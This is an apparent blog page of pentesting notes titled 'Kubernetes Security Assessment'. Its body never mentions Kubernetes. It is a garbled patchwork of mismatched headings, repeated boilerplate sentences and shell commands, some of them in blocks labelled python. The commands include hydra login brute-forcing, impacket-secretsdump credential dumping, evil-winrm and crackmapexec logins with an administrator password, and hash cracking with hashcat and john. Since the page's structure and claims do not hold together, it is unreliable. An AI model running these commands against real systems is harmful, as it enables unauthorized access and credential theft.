---
TitleSEO: "Kubernetes Security Assessment | ZureFX"
TitlePost: "Kubernetes Security Assessment"
Author: "ZureFX"
Description: "Personal notes on Kubernetes Security Assessment. Quick reference for pentesting and CTF challenges."
Keywords: "cheatsheet, malware, privilege escalation, dfir, networking, blue team"
URL: "https://zurefx.github.io/notes/note-kubernetes-security-assessment-911.html"
URL_IMAGES: ""
Date: "2026-01-20"
Tags: "Cheatsheet, Malware, Privilege Escalation, DFIR, Networking, Blue Team"
Section: "notes"
Lang: "en"
main_img: "note-kubernetes-security-assessment-911"
Permalink: "/notes/note-kubernetes-security-assessment-911.html"
BtnLabel: "Read Notes"
Pick: 0
---
## AlwaysInstallElevated

### Remote File Inclusion

The application stored sensitive credentials in an unencrypted configuration file. Authentication bypass was achieved through careful manipulation of the login mechanism. The backup files contained sensitive information that should not have been accessible. The backup files contained sensitive information that should not have been accessible. Authentication bypass was achieved through careful manipulation of the login mechanism.

The target system was identified as running a vulnerable version of the service. Initial enumeration revealed several interesting open ports on the target. The backup files contained sensitive information that should not have been accessible. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
gobuster dir -u http://10.30.164.89/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.44.3.251 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.84.72.88
```

- `Cron Job`
- `SSRF`
- `burpsuite`
- `CORS Misconfiguration`
- `Unconstrained Delegation`

Weak file permissions allowed modification of critical system files. The kernel version was outdated and vulnerable to a publicly known exploit. Group Policy Preferences contained encrypted but recoverable credentials.

## Kerberoasting

### SeImpersonatePrivilege

Token impersonation allowed elevation to SYSTEM privileges on the target. Group Policy Preferences contained encrypted but recoverable credentials. The scheduled task ran with elevated privileges and could be abused for escalation. Command injection was possible through unsanitized user input in the search functionality. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
feroxbuster -h
```

The service account had excessive permissions assigned in Active Directory. Initial enumeration revealed several interesting open ports on the target. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.122.153.10 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.125.86.128
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.102.227.76/FUZZ
feroxbuster -h
```

## GPP Password

### HTTP

Initial enumeration revealed several interesting open ports on the target. Lateral movement was facilitated by reusing discovered credentials across services. The application stored sensitive credentials in an unencrypted configuration file. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
nmap -sCV -p5432,993,21 10.17.201.8 -oN scan.txt
```

```bash
evil-winrm -i 10.45.5.180 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.21.183.147 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.99.194.225/FUZZ
```

## Python

### bloodhound

Weak file permissions allowed modification of critical system files. The database credentials were hardcoded in the application source code.

The backup files contained sensitive information that should not have been accessible. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
evil-winrm -i 10.85.15.123 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.77.151.171 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
crackmapexec smb 10.42.235.81 -u administrator -p 'P@ssw0rd!' --shares
```

## Cron Job

### LXD Privilege Escalation

The scheduled task ran with elevated privileges and could be abused for escalation. Lateral movement was facilitated by reusing discovered credentials across services. The scheduled task ran with elevated privileges and could be abused for escalation.

```python
evil-winrm -i 10.57.248.129 -u administrator -p 'P@ssw0rd!'
```

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.19.171.20 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p3389,135,3268 10.88.178.182 -oN scan.txt
```

## Java

### Unquoted Service Path

```bash
nmap -sCV -p139,135,22 10.41.209.139 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.18.39.89 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
```

```bash
crackmapexec smb 10.55.142.133 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.81.144.225 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.72.110.74 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.56.46.39/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

```python
impacket-secretsdump administrator:'P@ssw0rd!'@10.72.253.107
gobuster dir -u http://10.27.61.30/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
```

The scheduled task ran with elevated privileges and could be abused for escalation. Initial enumeration revealed several interesting open ports on the target. The scheduled task ran with elevated privileges and could be abused for escalation. Network traffic analysis revealed unencrypted communications containing user credentials. Initial enumeration revealed several interesting open ports on the target.
